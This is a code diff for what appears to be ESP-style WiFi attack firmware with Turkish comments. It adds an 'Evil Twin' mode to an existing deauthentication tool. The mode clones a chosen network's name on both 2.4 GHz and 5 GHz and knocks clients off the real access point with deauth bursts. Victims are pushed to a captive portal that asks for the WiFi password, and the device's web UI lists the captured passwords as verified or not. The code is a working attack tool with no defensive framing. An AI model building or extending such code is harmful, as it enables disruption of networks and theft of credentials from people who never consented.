@@ -6,6 +6,7 @@
 #include "WiFi.h"
 #include "WiFiServer.h"
 #include "WiFiClient.h"
+#include "evil_twin.h"
 
 // ─── Configuration ────────────────────────────────────────────────────────────
 char *ssid = "X";
@@ -269,7 +270,7 @@ String makeResponse(int code, String content_type) {
 }
 
 String makeRedirect(String url) {
-  return "HTTP/1.1 307 Temporary Redirect\nLocation: " + url;
+  return "HTTP/1.1 307 Temporary Redirect\r\nLocation: " + url + "\r\n\r\n";
 }
 
 // ─── Web UI ───────────────────────────────────────────────────────────────────
@@ -397,6 +398,79 @@ void handleRoot(WiFiClient &client) {
   response += "<p style='font-size:.85em;color:#555;'>Her saldırı burst'ünde tüm reason code'lar otomatik gönderilir: <b>2, 3, 4, 6, 8</b> (Deauth) + <b>2, 3, 8</b> (Disassoc) &mdash; iOS, Android ve Windows için eş zamanlı.</p>";
   response += "<input class='btn-attack' type='submit' value='&#9889; Launch Attack'></form>";
 
+  // ── Evil Twin bölümü ───────────────────────────────────────────────────────
+  response += "<h2>&#128126; Evil Twin &mdash; Captive Portal</h2>";
+  response += "<div style='background:#fff;padding:20px;border-radius:6px;box-shadow:0 2px 5px rgba(0,0,0,.1);margin-bottom:20px;'>";
+
+  if (evil_twin_active) {
+    // ── Aktif durum bilgisi ──────────────────────────────────────────────────
+    response += "<div style='background:#fdecea;border:1px solid #e74c3c;border-radius:5px;padding:10px 14px;margin-bottom:10px;font-weight:bold;color:#c0392b;'>";
+    response += "&#128308; Evil Twin AKTIF &mdash; SSID: <b>" + evil_twin_ssid + "</b>";
+    response += " &nbsp;|&nbsp; Kanal: " + String(evil_twin_channel);
+    response += " &nbsp;|&nbsp; Bagli istemci: " + String(evil_twin_clients);
+    if (evil_twin_dual_band) {
+      response += "<br><span style='font-size:.85em;'>&#128225; Cift Bant &mdash;";
+      response += " 2.4GHz CH:" + String(evil_twin_channel <= 13 ? evil_twin_channel : evil_twin_channel2);
+      response += " &nbsp;|&nbsp; 5GHz CH:" + String(evil_twin_channel >= 36 ? evil_twin_channel : evil_twin_channel2);
+      if (evil_twin_ssid2.length() > 0 && evil_twin_ssid2 != evil_twin_ssid)
+        response += " &nbsp;|&nbsp; 5GHz SSID: " + evil_twin_ssid2;
+      response += "</span>";
+    }
+    response += "</div>";
+
+    if (et_password_count > 0) {
+      response += "<div style='background:#eafaf1;border:1px solid #27ae60;border-radius:5px;padding:10px 14px;margin-bottom:10px;'>";
+      response += "<b>&#128273; Yakalanan Sifreler (" + String(et_password_count) + "):</b><br>";
+      for (int i = 0; i < et_password_count; i++) {
+        response += "<span style='font-family:monospace;background:#f0f0f0;padding:2px 8px;border-radius:3px;margin-right:6px;margin-top:4px;display:inline-block;'>";
+        response += et_passwords[i].ssid + " &rarr; <b>" + et_passwords[i].password + "</b>";
+        if (et_passwords[i].verified) response += " <span style='color:#27ae60;'>&#9989; Dogrulandi</span>";
+        response += "</span>";
+      }
+      response += "</div>";
+    }
+
+    response += "<form method='post' action='/stop_evil_twin'>";
+    response += "<input type='submit' style='padding:10px 22px;border:none;border-radius:4px;cursor:pointer;font-size:1em;color:#fff;background:#e67e22;' value='&#9632; Evil Twin Durdur'>";
+    response += "</form>";
+
+  } else {
+    // ── Başlatma formu ───────────────────────────────────────────────────────
+    response += "<p style='font-size:.88em;color:#555;margin-bottom:12px;'>"
+                "Hedef agin SSID&apos;sini klonlar, sahte (acik) bir AP baslatilar. "
+                "Gercek AP&apos;ye deauth gondererek istemcileri koparir. "
+                "Ayni modeme ait 2.4GHz ve 5GHz aglari otomatik tespit edilerek "
+                "<b>her iki banda ayni anda saldiri yapilir</b>. "
+                "Baglanan kurbanlar <b>captive portal</b> uzerinden WiFi sifresini girmek zorunda kalir.</p>";
+
+    response += "<form method='post' action='/evil_twin'>";
+    response += "<label style='font-size:.9em;color:#333;font-weight:600;'>Hedef AG:</label><br>";
+    response += "<select name='idx' style='padding:8px 10px;border:1px solid #ccc;border-radius:4px;"
+                "font-size:.92em;width:100%;max-width:480px;margin-top:6px;margin-bottom:10px;"
+                "background:#fafafa;'>";
+    response += "<option value='-1' disabled selected>-- Ag secin --</option>";
+
+    // Tarama sonuçlarını dropdown'a ekle
+    for (uint32_t i = 0; i < scan_results.size(); i++) {
+      String label = (scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(gizli)";
+      bool   is5g  = (scan_results[i].channel >= 36);
+      response += "<option value='" + String(i) + "'>";
+      response += "[" + String(i) + "] ";
+      response += label;
+      response += " (CH:" + String(scan_results[i].channel) + ", ";
+      response += is5g ? "5GHz" : "2.4GHz";
+      response += ", " + scan_results[i].bssid_str + ")";
+      response += "</option>";
+    }
+
+    response += "</select><br>";
+    response += "<input type='submit' style='padding:10px 22px;border:none;border-radius:4px;"
+                "cursor:pointer;font-size:1em;color:#fff;background:#8e44ad;' "
+                "value='&#128126; Evil Twin Baslat'>";
+    response += "</form>";
+  }
+  response += "</div>";
+
   // Active targets section
   if (attacking) {
     response += "<h2>Active Targets</h2><table>";
@@ -505,12 +579,26 @@ void loop() {
   // ── Web server ──
   WiFiClient client = server.available();
   if (client.connected()) {
+    // Referans proje gibi zaman aşımına dayalı okuma:
+    // POST body başlıklardan sonra ayrı TCP parçasında gelebilir.
+    // Her byte geldiğinde timeout sıfırlanır; 300 ms sessizlik → okuma bitti.
     String request;
-    while (client.available()) {
-      while (client.available()) request += (char)client.read();
-      delay(1);
+    {
+      unsigned long _t = millis();
+      while (client.connected() && (millis() - _t < 300)) {
+        if (client.available()) {
+          request += (char)client.read();
+          _t = millis();  // byte geldikçe timeout sıfırla
+        }
+      }
     }
     String path = parseRequest(request);
+
+    // ── Evil Twin Captive Portal — önce kontrol et ────────────────────────────
+    if (evil_twin_portal_handle(client, request, path)) {
+      client.stop();
+      return;
+    }
 
     if (path == "/") {
       handleRoot(client);
@@ -523,6 +611,103 @@ void loop() {
 
     } else if (path == "/stop") {
       deauth_targets.clear();
+      client.write(makeRedirect("/").c_str());
+
+    // ── Evil Twin route'ları ───────────────────────────────────────────────
+    } else if (path == "/evil_twin") {
+      std::vector<std::pair<String,String>> post_data = parsePost(request);
+      int idx = -1;
+      for (auto &p : post_data) {
+        if (p.first == "idx") { idx = p.second.toInt(); break; }
+      }
+      if (idx >= 0 && idx < (int)scan_results.size()) {
+        deauth_targets.clear();
+
+        // ── Birinci band parametreleri ──────────────────────────────────────
+        evil_twin_ssid    = (scan_results[idx].ssid.length() > 0)
+                              ? scan_results[idx].ssid : "WiFi";
+        evil_twin_channel = scan_results[idx].channel;
+        memcpy(evil_twin_bssid, scan_results[idx].bssid, 6);
+
+        // ── İkinci band otomatik tespiti — 4 öncelik + fallback ─────────────
+        //
+        // Öncelik 1: BSSID son oktet ±1 + farklı band  (standart modem eşleme)
+        // Öncelik 2: BSSID son oktet ±2..4 + aynı OUI (ilk 3B) + farklı band
+        // Öncelik 3: Aynı SSID + aynı OUI (band-steering, tek SSID iki band)
+        // Öncelik 4: SSID prefix eşleşmesi + farklı band  ("WiFi"↔"WiFi_5G")
+        // Fallback : Taramada eş bulunamadıysa → BSSID±1 ile tahmin et
+        //            (bazı modems band-steered → scan'de tek giriş görünür)
+        evil_twin_dual_band = false;
+        evil_twin_channel2  = 0;
+        memset(evil_twin_bssid2, 0, 6);
+        evil_twin_ssid2     = "";
+
+        // Değerlendirme skoru: yüksek skor = daha güvenilir eşleşme
+        int best_score = 0;
+
+        for (int j = 0; j < (int)scan_results.size(); j++) {
+          if (j == idx) continue;
+
+          // Kanal bandı farklı mı? (2.4GHz: ch≤13, 5GHz: ch≥36)
+          bool prim_24 = (scan_results[idx].channel <= 13);
+          bool cand_24 = (scan_results[j].channel   <= 13);
+          bool diff_band = (prim_24 != cand_24);
+          if (!diff_band) continue;  // Aynı band → atla
+
+          uint8_t *bA = scan_results[idx].bssid;
+          uint8_t *bB = scan_results[j].bssid;
+          String   sA = scan_results[idx].ssid;
+          String   sB = scan_results[j].ssid;
+
+          bool same_oui      = (memcmp(bA, bB, 3) == 0);
+          bool first5_match  = (memcmp(bA, bB, 5) == 0);
+          int  last_diff     = abs((int)bB[5] - (int)bA[5]);
+
+          int score = 0;
+
+          // Öncelik 1: BSSID son oktet ±1 (en kesin eşleşme)
+          if (first5_match && last_diff == 1) score = 100;
+          // Öncelik 2: BSSID son oktet ±2..4 + aynı OUI
+          else if (first5_match && last_diff <= 4) score = 80;
+          // Öncelik 3: Aynı SSID + aynı OUI
+          // Band-steering: modem iki banda aynı adı verir; OUI kontrolü
+          // farklı komşu modemlerle karışmayı engeller
+          else if (sA == sB && same_oui) score = 60;
+          // Öncelik 4: SSID prefix (WiFi ↔ WiFi_5G / WiFi 5GHz vb.)
+          else if (same_oui &&
+                   ((sB.startsWith(sA) && sB.length() > sA.length()) ||
+                    (sA.startsWith(sB) && sA.length() > sB.length()))) score = 40;
+          // OUI olmadan yalnızca aynı SSID (zayıf — farklı modem riski var)
+          else if (sA == sB) score = 20;
+
+          if (score > best_score) {
+            best_score          = score;
+            evil_twin_dual_band = true;
+            evil_twin_channel2  = scan_results[j].channel;
+            memcpy(evil_twin_bssid2, bB, 6);
+            evil_twin_ssid2     = (sB.length() > 0) ? sB : sA;
+          }
+        }
+
+        // ── Fallback: taramada eş bulunamadı ─────────────────────────────────
+        // Band-steering modemi bazen yalnızca bir SSID giriş gösterir.
+        // BSSID'yi ±1 ile tahmin et; kanal olarak yaygın 5GHz/2.4GHz dene.
+        if (!evil_twin_dual_band) {
+          computePairBSSID(scan_results[idx].bssid,
+                           scan_results[idx].channel,
+                           evil_twin_bssid2);
+          // Birincil band 2.4GHz → tahmin kanalı 36, tersi ise 6
+          evil_twin_channel2  = (scan_results[idx].channel <= 13) ? 36 : 6;
+          evil_twin_ssid2     = evil_twin_ssid;  // Aynı SSID (band-steering)
+          evil_twin_dual_band = true;
+        }
+
+        start_evil_twin(idx);
+      }
+      client.write(makeRedirect("/").c_str());
+
+    } else if (path == "/stop_evil_twin") {
+      stop_evil_twin();
       client.write(makeRedirect("/").c_str());
 
     } else if (path == "/deauth") {
@@ -575,6 +760,12 @@ void loop() {
     }
 
     client.stop();
+  }
+
+  // ── Evil Twin döngüsü ──
+  if (evil_twin_active) {
+    evil_twin_loop();
+    return;  // ET aktifken normal deauth döngüsü çalışmasın
   }
 
   // ── Attack loop ──
